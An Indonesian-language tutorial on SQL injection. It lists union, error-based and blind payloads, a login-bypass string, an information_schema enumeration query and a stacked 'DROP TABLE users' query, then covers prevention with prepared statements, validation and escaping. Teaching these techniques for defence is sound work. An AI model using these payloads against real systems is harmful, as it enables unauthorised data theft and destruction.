SQL Injection: Panduan Lengkap

Apa itu SQL Injection?

SQL Injection adalah teknik hacking yang memanfaatkan celah keamanan pada lapisan database sebuah aplikasi. Penyerang dapat menyisipkan perintah SQL berbahaya melalui input yang tidak tervalidasi dengan baik, yang kemudian dieksekusi oleh database server.

Jenis-jenis SQL Injection

1. Union-Based SQL Injection

Teknik ini menggunakan operator UNION SQL untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT. Contoh:

' UNION SELECT username, password FROM users--

2. Error-Based SQL Injection

Memanfaatkan pesan error database untuk mendapatkan informasi. Contoh:

' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--

3. Blind SQL Injection

Teknik ini digunakan ketika aplikasi tidak menampilkan pesan error. Terdapat dua jenis:

  • Boolean-Based:
    • ' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)--
  • Time-Based:
    • ' AND IF(LENGTH(database())>5, SLEEP(5), 0)--

Contoh Praktis SQL Injection

1. Login Bypass

Skenario umum pada form login:

username: admin' OR '1'='1'-- password: [apapun]

2. Data Extraction

Mengambil data dari tabel lain:

1 UNION SELECT null, concat(table_name) FROM information_schema.tables--

3. Stacked Queries

Menjalankan multiple queries:

1; DROP TABLE users--

Cara Mencegah SQL Injection

1. Prepared Statements

Gunakan prepared statements untuk memisahkan query dari data:

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?"); $stmt->execute([$username, $password]);

2. Input Validation

Validasi semua input user:

if (!preg_match('/^[a-zA-Z0-9]+$/', $username)) { die('Invalid username'); }

3. Escape Special Characters

Gunakan fungsi escaping yang sesuai:

$safe_string = mysqli_real_escape_string($conn, $user_input);

Best Practices Keamanan Database

  • ✓ Gunakan prinsip least privilege untuk user database
  • ✓ Lakukan sanitasi pada semua input user
  • ✓ Gunakan WAF (Web Application Firewall)
  • ✓ Update database dan framework secara regular
  • ✓ Monitor log database untuk aktivitas mencurigakan
